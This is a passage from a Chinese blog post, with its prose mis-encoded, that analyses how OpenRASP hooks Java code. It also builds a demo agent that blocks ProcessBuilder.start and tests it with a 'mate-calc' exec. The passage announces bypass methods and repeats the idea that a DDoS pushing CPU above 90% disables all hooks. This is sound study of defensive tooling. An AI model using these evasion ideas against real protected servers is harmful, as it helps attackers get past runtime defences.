function_">getInvokeStaticSrc</span><span class="params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">invokeClassName</span> <span class="operator">=</span> invokeClass.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterTypesString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (parameterTypes != <span class="literal">null</span> &amp;&amp; parameterTypes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Class[] arr$ = parameterTypes;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> parameterTypes.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">parameterType</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">                <span class="keyword">if</span> (parameterType.getName().startsWith(<span class="string">&quot;[&quot;</span>)) &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + <span class="string">&quot;Class.forName(\&quot;&quot;</span> + parameterType.getName() + <span class="string">&quot;\&quot;),&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + parameterType.getName() + <span class="string">&quot;.class,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parameterTypesString = parameterTypesString.substring(<span class="number">0</span>, parameterTypesString.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parameterTypesString.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            parameterTypesString = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            parameterTypesString = <span class="string">&quot;new Class[]&#123;&quot;</span> + parameterTypesString + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String src;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isLoadedByBootstrapLoader) &#123;</span><br><span class="line">            src = <span class="string">&quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot;</span> + invokeClassName + <span class="string">&quot;\&quot;).getMethod(\&quot;&quot;</span> + methodName + <span class="string">&quot;\&quot;,&quot;</span> + parameterTypesString + <span class="string">&quot;).invoke(null&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.isEmpty(paramString)) &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,new Object[]&#123;&quot;</span> + paramString + <span class="string">&quot;&#125;);&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,null);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getCause() != null &amp;&amp; t.getCause().getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            src = invokeClassName + <span class="string">&#x27;.&#x27;</span> + methodName + <span class="string">&quot;(&quot;</span> + paramString + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> src;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´é€»è¾‘å°±æ˜¯è·å–XXEHookç±»çš„checkXXEæ–¹æ³•çš„å­—èŠ‚ç å¹¶å°†å…¶å†™å…¥åˆ°äº†sinkç‚¹çš„è¿è¡Œå‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šè¾¹æåˆ°çš„é‚£ä¸¤ä¸ªæ–¹æ³•ã€‚ç°åœ¨è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„å°†jaråŒ…æ·»åŠ åˆ°BootstrapClassloaderçš„æœç´¢è·¯å¾„çš„æ“ä½œå—ï¼Ÿæ³¨æ„çœ‹getInvokeStaticSrcæ–¹æ³•è¿™é‡Œåœ¨sinkç‚¹çš„è¿è¡Œå‰æ·»åŠ äº†ä¸€æ®µ<code>src = &quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot; + invokeClassName + &quot;\&quot;).getMethod(\&quot;&quot; + methodName + &quot;\&quot;,&quot; + parameterTypesString + &quot;).invoke(null&quot;;</code>ï¼ŒmoduleClassLoaderæ˜¯BootstrapClassloaderï¼Œå› æ­¤å½“æˆ‘ä»¬åœ¨ç”±BootstrapClassloaderåŠ è½½çš„ç±»ä¸­æ’å…¥è¿™æ®µä»£ç æ—¶ï¼Œè¿™ä¸ªç±»å°±å¯ä»¥åŠ è½½åˆ°äº†<code>XXXHook</code>ä¸­çš„<code>checkXXX</code>æ–¹æ³•æ¥è¿›è¡Œæ£€æµ‹é˜²å¾¡äº†ã€‚åœ¨æ­¤å¤„å°±æ˜¯åŠ è½½åˆ°äº†XXEHookä¸­çš„checkXXEæ–¹æ³•ã€‚</p><p>ä¹‹åæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹checkXXXæ–¹æ³•çœ‹çœ‹æ˜¯æ€ä¹ˆå¯¹æ¶æ„æ”»å‡»è¿›è¡Œé˜²å¾¡çš„ï¼Œä»¥XXEHOOKçš„checkXXEæ–¹æ³•ä¸ºä¾‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6ed1ddac507cc85ba45.jpg" title="image-20230806144603157" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6ed1ddac507cc85ba45.jpg" alt="image-20230806144603157"></a></p><p>è°ƒç”¨åˆ°com.baidu.openrasp.HookHandler#doCheckï¼Œä¹‹ååˆè°ƒç”¨åˆ°com.baidu.openrasp.HookHandler#doCheckWithoutRequestï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6fa1ddac507cc85da96.jpg" title="image-20230806144732533" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6fa1ddac507cc85da96.jpg" alt="image-20230806144732533"></a></p><p>æ­¤å¤„ä¸ºRASPçš„ç†”æ–­å¼€å…³ï¼Œå½“æœåŠ¡å™¨çš„cpuä½¿ç”¨ç‡è¶…è¿‡90%ï¼Œç¦ç”¨å…¨éƒ¨hookç‚¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getDisableHooks()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸šåŠ¡å¤§äºå®‰å…¨çš„è€ƒå½•ï¼Œç†”æ–­å¼€å…³åœ¨è®¸å¤šçš„RASPäº§å“éƒ½å¯ä»¥è¿›è¡Œè®¾ç½®ã€‚å› æ­¤æœ‰å¸ˆå‚…æåˆ°ä¹Ÿè®¸å¯ä»¥é€šè¿‡DDOSï¼Œè®©CPUé«˜è´Ÿè½½ï¼Œä½¿ç”¨ç‡è¶…è¿‡90%ï¼Œä»è€Œç¦ç”¨å…¨éƒ¨hookç‚¹ã€‚å½“äº‘æ§æ³¨å†ŒæˆåŠŸä¹‹å‰ï¼Œä¸è¿›å…¥ä»»ä½•hookç‚¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getCloudSwitch() &amp;&amp; Config.getConfig().getHookWhiteAll()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åèµ°åˆ°com.baidu.openrasp.HookHandler#doRealCheckWithoutRequestï¼Œåœ¨è¿™é‡Œï¼Œé¦–å…ˆåˆ¤æ–­RASPå¼€å…³æ˜¯å¦æ‰“å¼€ï¼Œå³å¯¹<code>enableHook.get()</code>ä½œåˆ¤æ–­ã€‚ä¹‹åï¼Œåšäº†ä¸€äº›å‚æ•°çš„å°è£…ï¼Œä»¥åŠå¤±è´¥æ—¥å¿—ã€è€—æ—¶æ—¥å¿—ç­‰è¾“å‡ºï¼Œå¹¶ä¸”åœ¨æ£€æµ‹åˆ°æ”»å‡»æ—¶ï¼ˆä¸‹ä¸€å±‚è¿”å›ï¼‰ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doRealCheckWithoutRequest</span><span class="params">(CheckParameter.Type type, Map params)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (enableHook.get()) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">            <span class="keyword">if</span> (Config.getConfig().getDebugLevel() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                a = System.currentTimeMillis();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isBlock</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">CheckParameter</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CheckParameter</span>(type, params);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                isBlock = CheckerManager.check(type, parameter);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;plugin check error: &quot;</span> + var12.getClass().getName() + <span class="string">&quot; because: &quot;</span> + var12.getMessage();</span><br><span class="line">                <span class="type">AbstractRequest</span> <span class="variable">request</span> <span class="operator">=</span> (AbstractRequest)requestCache.get();</span><br><span class="line">                <span class="keyword">if</span> (request != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">StringBuffer</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURL();</span><br><span class="line">                    <span class="keyword">if</span> (!StringUtils.isEmpty(url)) &#123;</span><br><span class="line">                        msg = url + <span class="string">&quot; &quot;</span> + msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                LogTool.error(ErrorType.PLUGIN_ERROR, msg, var12);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (a &gt; <span class="number">0L</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t</span> <span class="operator">=</span> System.currentTimeMillis() - a;</span><br><span class="line">                <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;type=&quot;</span> + type.getName() + <span class="string">&quot; &quot;</span> + <span class="string">&quot;time=&quot;</span> + t;</span><br><span class="line">                <span class="keyword">if</span> (requestCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    LOGGER.info(<span class="string">&quot;request_id=&quot;</span> + ((AbstractRequest)requestCache.get()).getRequestId() + <span class="string">&quot; &quot;</span> + message);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    LOGGER.info(message);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isBlock) &#123;</span><br><span class="line">                handleBlock(parameter);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰§è¡Œåˆ°com.baidu.openrasp.plugin.checker.CheckerManager#checkï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(CheckParameter.Type type, CheckParameter parameter)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Checker)checkers.get(type)).check(parameter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ ¹æ®ä¼ å…¥çš„typeæ¥é€‰æ‹©è°ƒç”¨ç›¸å¯¹åº”çš„checkersçš„checkæ–¹æ³•ï¼Œå‡è®¾æ­¤æ—¶çš„checkeræ˜¯V8AttackCheckerï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨com.baidu.openrasp.plugin.checker.AbstractChecker#checkï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7081ddac507cc85f97b.jpg" title="image-20230806145906724" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7081ddac507cc85f97b.jpg" alt="image-20230806145906724"></a></p><p>è°ƒç”¨äº†ç›¸åº”checkerçš„checkParamæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬çœ‹çœ‹com.baidu.openrasp.plugin.checker.v8.V8AttackChecker#checkParamï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7131ddac507cc860fd6.jpg" title="image-20230806145936500" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7131ddac507cc860fd6.jpg" alt="image-20230806145936500"></a></p><p>ç»§ç»­è·Ÿè¿›com.baidu.openrasp.plugin.js.JS#Checkï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd71e1ddac507cc8629ae.jpg" title="image-20230806150051302" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd71e1ddac507cc8629ae.jpg" alt="image-20230806150051302"></a></p><p>ç®­å¤´æŒ‡å‘çš„åœ°æ–¹å³æ˜¯è°ƒç”¨JSæ’ä»¶è¿›è¡Œæ£€æµ‹çš„åœ°æ–¹äº†ã€‚</p><h2 id="Demo-RASPå®ç°"><a href="#Demo-RASPå®ç°" class="headerlink" title="Demo RASPå®ç°"></a>Demo RASPå®ç°</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¸¸è§çš„Runtime.getRuntime().exec()æ‰§è¡Œå‘½ä»¤çš„åº•å±‚é€»è¾‘æ˜¯é€šè¿‡ProcessBuilderçš„startæ–¹æ³•å»æ‰§è¡Œå‘½ä»¤çš„ï¼Œè€ŒProcessBuilderæ‰§è¡Œå‘½ä»¤å®é™…ä¸Šä¹Ÿæ˜¯è°ƒç”¨äº†ProcessImplè¿™ä¸ªç±»çš„startæ–¹æ³•ã€‚é‚£æˆ‘ä»¬å¦‚æœæƒ³é˜²æ­¢è¿™ç§å‘½ä»¤æ‰§è¡Œçš„è¯ï¼Œå°±éœ€è¦åœ¨ProcessImplå¤„è¿›è¡Œhookã€‚æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹OpenRASPæ˜¯æ€ä¹ˆåšçš„ï¼Œé¦–å…ˆçœ‹çœ‹å¦‚ä½•åŒ¹é…ç±»çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7291ddac507cc8643bb.jpg" title="image-20230806135243062" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7291ddac507cc8643bb.jpg" alt="image-20230806135243062"></a></p><p>å…ˆåˆ¤æ–­javaç‰ˆæœ¬ï¼Œå¦‚æœå¤§äºç­‰äº1.9åˆ™å¯¹<code>java/lang/ProcessImpl</code>è¿›è¡Œhookï¼Œè¿™æ˜¯å› ä¸ºåœ¨JDK9çš„æ—¶å€™æŠŠ<code>UNIXProcess</code>åˆå¹¶åˆ°äº†<code>ProcessImpl</code>å½“ä¸­ï¼Œå‚è€ƒ<a href="https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97">https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97</a>ã€‚ä¹‹åå¦‚æœå°äº1.9ç»§ç»­åˆ¤æ–­ï¼Œå¦‚æœæ˜¯Windowsæ“ä½œç³»ç»Ÿï¼Œåˆ™å¯¹<code>java/lang/ProcessImpl</code>è¿›è¡Œhookï¼Œå¦åˆ™å¯¹java&#x2F;lang&#x2F;UNIXProcessè¿›è¡Œhookã€‚æˆ‘ä»¬ç»§ç»­çœ‹çœ‹æ’å…¥çš„ä»£ç ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7341ddac507cc8657eb.jpg" title="image-20230806135850824" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7341ddac507cc8657eb.jpg" alt="image-20230806135850824"></a></p><p>æ ¹æ®ç›¸åº”çš„é€»è¾‘åœ¨ProcessImplç±»çš„åˆå§‹åŒ–æ–¹æ³•æˆ–è€…UNIXProcessç±»çš„åˆå§‹åŒ–æ–¹æ³•ä¸­æ’å…¥ç›¸åº”çš„<code>checkCommand</code>æ–¹æ³•ã€‚ç°åœ¨æˆ‘å…ˆæ¥ç»™å¤§å®¶å†™ä¸€ä¸ªDemo RASPï¼Œå¹¶ç»™å‡ºå…¶ç›¸åº”bypassæ–¹æ³•ã€‚é¦–å…ˆç»™å‡ºå®ç°äº†premainæ–¹æ³•çš„PreMainDemoç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreMainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> IOException, UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line"></span><br><span class="line">        addJarToBootstrap(inst);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line"><span class="comment">//            System.out.println(aClass);</span></span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().contains(<span class="string">&quot;ProcessBuilder&quot;</span>) &amp;&amp; inst.isModifiableClass(aClass))&#123;</span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(),<span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getLocalJarPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">localUrl</span> <span class="operator">=</span> PreMainDemo.class.getProtectionDomain().getCodeSource().getLocation();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            path = URLDecoder.decode(localUrl.getFile().replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;%2B&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var3) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;[OpenRASP] Failed to get jarFile path.&quot;</span>);</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addJarToBootstrap</span><span class="params">(Instrumentation inst)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">localJarPath</span> <span class="operator">=</span> getLocalJarPath();</span><br><span class="line">        inst.appendToBootstrapClassLoaderSearch(<span class="keyword">new</span> <span class="title class_">JarFile</span>(localJarPath));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ClassFileTransformerçš„å®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="literal">null</span>;</span><br><span class="line">        className = className.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> cp.get(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">                CtMethod[] methods = ctClass.getMethods();</span><br><span class="line">                <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;    System.out.println(\&quot;Get Out!Hacker!\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    return null;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (CtMethod method : methods) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;start&quot;</span>)) &#123;</span><br><span class="line">                        method.insertBefore(source);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                bytes = ctClass.toBytecode();</span><br><span class="line">                ctClass.detach();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//                e.printStackTrace();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªDemoéå¸¸çš„ç®€å•ï¼Œä¸OpenRASPç±»ä¼¼ï¼Œéƒ½æ˜¯å°†agent.jaræ·»åŠ åˆ°BootstrapClassloaderï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬è¿™ä¸ªDemoå¹¶ä¸åœ¨BootstrapClassloaderåŠ è½½çš„ç±»ä¸­æ·»åŠ è°ƒç”¨agent.jarçš„ä»£ç ï¼Œå› æ­¤åœ¨è¿™ä¸ªDemoä¸­è¿™éƒ¨åˆ†å¯ä»¥å¿½ç•¥ã€‚ä¹‹åæˆ‘ä»¬è¿˜newäº†ä¸€ä¸ªProcessBuilderç±»ï¼Œå› ä¸ºå¦‚æœä¸åˆ›å»ºè¿™ä¸ªå®ä¾‹çš„è¯ï¼Œinst.getAllLoadedClasses()ä¸­å°†æ²¡æœ‰è¿™ä¸ªç±»ã€‚ä¹‹åæˆ‘ä»¬<strong>æ— è„‘</strong>å¯¹ProcessBuilderç±»çš„startæ–¹æ³•æ·»åŠ äº†ä¸¤è¡Œä»£ç ï¼Œé¦–å…ˆè¾“å‡ºGet Out!Hacker!ï¼Œä¹‹åreturnã€‚ä¸ºä»€ä¹ˆè¯´æ˜¯æ— è„‘å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬è¿™æ ·åšï¼Œä¼šä½¿å¾—æ­£å¸¸çš„å‘½ä»¤æ‰§è¡Œçš„éœ€æ±‚éƒ½è¢«å±è”½äº†ï¼Œè€Œä¸”hookçš„æ˜¯ProcessBuilderç±»è€ŒéProcessImplç±»ï¼Œä¸ºä»€ä¹ˆhookçš„æ˜¯ProcessBuilderå°±æœ‰é—®é¢˜å‘¢ï¼Ÿæ¥ä¸‹æ¥æˆ‘æ¥ç»™å¤§å®¶åšä¸ªæ¼”ç¤ºï¼Œå†æ¥å†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„ç±»æ¥æ¨¡æ‹Ÿé»‘å®¢æ”»å‡»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€è¡Œå¾ˆç®€å•çš„å¼¹è®¡ç®—å™¨çš„ä»£ç ï¼Œä¹‹åæˆ‘ä»¬æ·»åŠ VM Optionsï¼Œæ·»åŠ <code>-javaagent</code>ä¸ºæˆ‘ä»¬åˆšåˆšæ‰“åŒ…å¥½çš„Demo.jarï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7411ddac507cc867270.jpg" title="image-20230806141750369" class="gallery-item"><img 